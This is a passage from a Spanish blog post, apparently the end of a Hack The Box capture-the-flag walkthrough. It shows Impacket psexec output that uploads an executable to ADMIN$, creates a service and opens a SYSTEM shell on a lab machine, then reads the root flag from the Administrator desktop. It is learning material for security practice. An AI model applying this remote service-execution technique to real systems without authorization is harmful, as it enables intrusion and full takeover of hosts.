+es satisfactoria, de tal modo que tenemos una terminal con permisos de&nbsp;administrador.</p>
+<div class="highlight"><pre><span></span><code>Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+Password:
+<span class="o">[</span>*<span class="o">]</span> Requesting shares on <span class="m">10</span>.10.10.27.....
+<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+<span class="o">[</span>*<span class="o">]</span> Uploading file jcWXyjRG.exe
+<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on <span class="m">10</span>.10.10.27.....
+<span class="o">[</span>*<span class="o">]</span> Creating service UFMW on <span class="m">10</span>.10.10.27.....
+<span class="o">[</span>*<span class="o">]</span> Starting service UFMW.....
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+Microsoft Windows <span class="o">[</span>Version <span class="m">10</span>.0.17763.107<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div>
+
+
+<p>Verificamos nuestros&nbsp;permisos:</p>
+<div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+</code></pre></div>
+
+
+<p>En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
+del administrador y extraer la última&nbsp;bandera.</p>
+<div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</code></pre></div>
+
+
+<div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+<span class="m">01</span>/20/2020  <span class="m">05</span>:42 AM    &lt;DIR&gt;          .
+<span class="m">01</span>/20/2020  <span class="m">05</span>:42 AM    &lt;DIR&gt;          ..
+<span class="m">02</span>/25/2020  <span class="m">06</span>:36 AM                <span class="m">32</span> root.txt
+               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">32</span> bytes
+               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  <span class="m">33</span>,818,599,424 bytes free
+</code></pre></div>
+
+
+<div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+</code></pre></div>
+
+
+<p>Listo! Tenemos las dos banderas de esta&nbsp;máquina!</p>
+<h2>Fin</h2>
+<p>Bueno, con eso hemos concluido la revisión del primer walk-through de las
+máquinas de introducción de <code>HTB</code>. Este texto fue un poco más extenso ya que se
+fueron expllicando paso a paso cada comando, pero conforme avancemos en las
+herramientas y comandos obviaremos los que se hayan explicado&nbsp;previamente.</p>
+<p>Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
+estos temas de seguridad, <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">recuerda no rendirte</a>
+y seguir aprendiendo poco a&nbsp;poco.</p>
+<p>Nos vemos en el siguiente texto.&nbsp;Ciao!</p>
 <p><code>#HappyHacking</code></p>
                 </div><!-- /.entry-content -->
         </article>
